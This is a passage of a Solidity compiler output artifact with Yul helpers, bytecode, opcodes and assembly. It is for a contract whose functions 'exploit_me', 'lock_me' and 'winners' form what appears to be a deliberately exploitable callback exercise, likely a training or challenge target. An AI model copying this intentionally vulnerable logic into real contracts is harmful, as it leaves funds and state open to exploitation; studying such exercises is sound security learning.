									"contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function validator_revert_t_uint256(value) {\n        if iszero(eq(value, cleanup_t_uint256(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_uint256(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_uint256(value)\n    }\n\n    function abi_decode_tuple_t_uint256(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length) -> updated_pos {\n        updated_pos := pos\n    }\n\n    function store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470(memPtr) {\n\n    }\n\n    function abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, 0)\n        store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470(pos)\n        end := add(pos, 0)\n    }\n\n    function abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed(pos ) -> end {\n\n        pos := abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack( pos)\n\n        end := pos\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100415760003560e01c80634c228cc714610046578063548853a014610050578063a2fb11751461006c575b600080fd5b61004e61009c565b005b61006a6004803603810190610065919061025c565b6100b8565b005b610086600480360381019061008191906102bf565b6101ba565b60405161009391906102fb565b60405180910390f35b60018060006101000a81548160ff021916908315150217905550565b6000600160006101000a81548160ff0219169083151502179055503373ffffffffffffffffffffffffffffffffffffffff166040516100f690610347565b6000604051808303816000865af19150503d8060008114610133576040519150601f19603f3d011682016040523d82523d6000602084013e610138565b606091505b505050600160009054906101000a900460ff1661015457600080fd5b6000819080600181540180825580915050600190039060005260206000200160009091909190916101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600081815481106101ca57600080fd5b906000526020600020016000915054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610229826101fe565b9050919050565b6102398161021e565b811461024457600080fd5b50565b60008135905061025681610230565b92915050565b600060208284031215610272576102716101f9565b5b600061028084828501610247565b91505092915050565b6000819050919050565b61029c81610289565b81146102a757600080fd5b50565b6000813590506102b981610293565b92915050565b6000602082840312156102d5576102d46101f9565b5b60006102e3848285016102aa565b91505092915050565b6102f58161021e565b82525050565b600060208201905061031060008301846102ec565b92915050565b600081905092915050565b50565b6000610331600083610316565b915061033c82610321565b600082019050919050565b600061035282610324565b915081905091905056fea2646970667358221220a5a9bfedaf629452741d1ddf6aa5e674a25ca8aee4b6f7869feebfc925d8942864736f6c634300080a0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x4C228CC7 EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x548853A0 EQ PUSH2 0x50 JUMPI DUP1 PUSH4 0xA2FB1175 EQ PUSH2 0x6C JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4E PUSH2 0x9C JUMP JUMPDEST STOP JUMPDEST PUSH2 0x6A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x65 SWAP2 SWAP1 PUSH2 0x25C JUMP JUMPDEST PUSH2 0xB8 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x86 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x81 SWAP2 SWAP1 PUSH2 0x2BF JUMP JUMPDEST PUSH2 0x1BA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x93 SWAP2 SWAP1 PUSH2 0x2FB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x1 DUP1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD PUSH2 0xF6 SWAP1 PUSH2 0x347 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x133 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x138 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH2 0x154 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 SWAP1 DUP1 PUSH1 0x1 DUP2 SLOAD ADD DUP1 DUP3 SSTORE DUP1 SWAP2 POP POP PUSH1 0x1 SWAP1 SUB SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 ADD PUSH1 0x0 SWAP1 SWAP2 SWAP1 SWAP2 SWAP1 SWAP2 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 DUP2 SLOAD DUP2 LT PUSH2 0x1CA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 ADD PUSH1 0x0 SWAP2 POP SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x229 DUP3 PUSH2 0x1FE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x239 DUP2 PUSH2 0x21E JUMP JUMPDEST DUP2 EQ PUSH2 0x244 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x256 DUP2 PUSH2 0x230 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x272 JUMPI PUSH2 0x271 PUSH2 0x1F9 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x280 DUP5 DUP3 DUP6 ADD PUSH2 0x247 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x29C DUP2 PUSH2 0x289 JUMP JUMPDEST DUP2 EQ PUSH2 0x2A7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x2B9 DUP2 PUSH2 0x293 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2D5 JUMPI PUSH2 0x2D4 PUSH2 0x1F9 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x2E3 DUP5 DUP3 DUP6 ADD PUSH2 0x2AA JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x2F5 DUP2 PUSH2 0x21E JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x310 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2EC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x331 PUSH1 0x0 DUP4 PUSH2 0x316 JUMP JUMPDEST SWAP2 POP PUSH2 0x33C DUP3 PUSH2 0x321 JUMP JUMPDEST PUSH1 0x0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x352 DUP3 PUSH2 0x324 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xA5 0xA9 0xBF 0xED 0xAF PUSH3 0x945274 SAR SAR 0xDF PUSH11 0xA5E674A25CA8AEE4B6F786 SWAP16 0xEE 0xBF 0xC9 0x25 0xD8 SWAP5 0x28 PUSH5 0x736F6C6343 STOP ADDMOD EXP STOP CALLER ",
							"sourceMap": "251:304:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;497:55;;;:::i;:::-;;327:162;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;278:24;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;497:55;540:4;533;;:11;;;;;;;;;;;;;;;;;;497:55::o;327:162::-;387:5;380:4;;:12;;;;;;;;;;;;;;;;;;405:10;:15;;:19;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;445:4;;;;;;;;;;;437:13;;;;;;461:7;474:6;461:20;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;327:162;:::o;278:24::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o;88:117:1:-;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:139::-;742:5;780:6;767:20;758:29;;796:33;823:5;796:33;:::i;:::-;696:139;;;;:::o;841:329::-;900:6;949:2;937:9;928:7;924:23;920:32;917:119;;;955:79;;:::i;:::-;917:119;1075:1;1100:53;1145:7;1136:6;1125:9;1121:22;1100:53;:::i;:::-;1090:63;;1046:117;841:329;;;;:::o;1176:77::-;1213:7;1242:5;1231:16;;1176:77;;;:::o;1259:122::-;1332:24;1350:5;1332:24;:::i;:::-;1325:5;1322:35;1312:63;;1371:1;1368;1361:12;1312:63;1259:122;:::o;1387:139::-;1433:5;1471:6;1458:20;1449:29;;1487:33;1514:5;1487:33;:::i;:::-;1387:139;;;;:::o;1532:329::-;1591:6;1640:2;1628:9;1619:7;1615:23;1611:32;1608:119;;;1646:79;;:::i;:::-;1608:119;1766:1;1791:53;1836:7;1827:6;1816:9;1812:22;1791:53;:::i;:::-;1781:63;;1737:117;1532:329;;;;:::o;1867:118::-;1954:24;1972:5;1954:24;:::i;:::-;1949:3;1942:37;1867:118;;:::o;1991:222::-;2084:4;2122:2;2111:9;2107:18;2099:26;;2135:71;2203:1;2192:9;2188:17;2179:6;2135:71;:::i;:::-;1991:222;;;;:::o;2219:147::-;2320:11;2357:3;2342:18;;2219:147;;;;:::o;2372:114::-;;:::o;2492:398::-;2651:3;2672:83;2753:1;2748:3;2672:83;:::i;:::-;2665:90;;2764:93;2853:3;2764:93;:::i;:::-;2882:1;2877:3;2873:11;2866:18;;2492:398;;;:::o;2896:379::-;3080:3;3102:147;3245:3;3102:147;:::i;:::-;3095:154;;3266:3;3259:10;;2896:379;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "182800",
								"executionCost": "226",
								"totalCost": "183026"
							},
							"external": {
								"exploit_me(address)": "infinite",
								"lock_me()": "24389",
								"winners(uint256)": "4978"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 251,
									"end": 555,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 251,
									"end": 555,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 251,
									"end": 555,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 251,
									"end": 555,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 251,
									"end": 555,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 251,
									"end": 555,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 251,
									"end": 555,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 251,
									"end": 555,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 251,
									"end": 555,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 251,
									"end": 555,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 251,
									"end": 555,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 251,
									"end": 555,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 251,
									"end": 555,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 251,
									"end": 555,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 251,
									"end": 555,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 251,
									"end": 555,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 251,
									"end": 555,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 251,
									"end": 555,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 251,
									"end": 555,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 251,
									"end": 555,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 251,
									"end": 555,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220a5a9bfedaf629452741d1ddf6aa5e674a25ca8aee4b6f7869feebfc925d8942864736f6c634300080a0033",
									".code": [
										{
											"begin": 251,
											"end": 555,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 251,
											"end": 555,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 251,
											"end": 555,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 251,
											"end": 555,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 251,
											"end": 555,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 251,
											"end": 555,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 251,
											"end": 555,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 251,
											"end": 555,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 251,
											"end": 555,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 251,
											"end": 555,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "PUSH",
											"source": 0,
											"value": "4C228CC7"
										},
										{
											"begin": 251,
											"end": 555,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 251,
											"end": 555,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "PUSH",
											"source": 0,
											"value": "548853A0"
										},
										{
											"begin": 251,
											"end": 555,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 251,
											"end": 555,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "PUSH",
											"source": 0,
											"value": "A2FB1175"
										},
										{
											"begin": 251,
											"end": 555,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 251,
											"end": 555,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 251,
											"end": 555,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 251,
											"end": 555,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 251,
											"end": 555,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 497,
											"end": 552,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 497,
											"end": 552,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 497,
											"end": 552,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 497,
											"end": 552,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 497,
											"end": 552,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 497,
											"end": 552,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 497,
											"end": 552,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 497,
											"end": 552,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 327,
											"end": 489,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 327,
											"end": 489,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 327,
											"end": 489,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 327,
											"end": 489,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 327,
											"end": 489,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 327,
											"end": 489,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 327,
											"end": 489,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 327,
											"end": 489,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 327,
											"end": 489,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 327,
											"end": 489,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 327,
											"end": 489,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 327,
											"end": 489,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 327,
											"end": 489,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 327,
											"end": 489,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 327,
											"end": 489,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 327,
											"end": 489,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 327,
											"end": 489,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 327,
											"end": 489,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 327,
											"end": 489,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 327,
											"end": 489,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 327,
											"end": 489,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 327,
											"end": 489,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 497,
											"end": 552,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 497,
											"end": 552,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 540,
											"end": 544,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 533,
											"end": 537,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 533,
											"end": 537,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 533,
											"end": 544,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 533,
											"end": 544,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 533,
											"end": 544,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 533,
											"end": 544,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 533,
											"end": 544,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 533,
											"end": 544,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 533,
											"end": 544,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 533,
											"end": 544,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 533,
											"end": 544,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 533,
											"end": 544,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 533,
											"end": 544,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 533,
											"end": 544,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 533,
											"end": 544,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 533,
											"end": 544,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 533,
											"end": 544,
											"name": "OR",
											"source": 0
										},
										{
											"begin": 533,
											"end": 544,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 533,
											"end": 544,
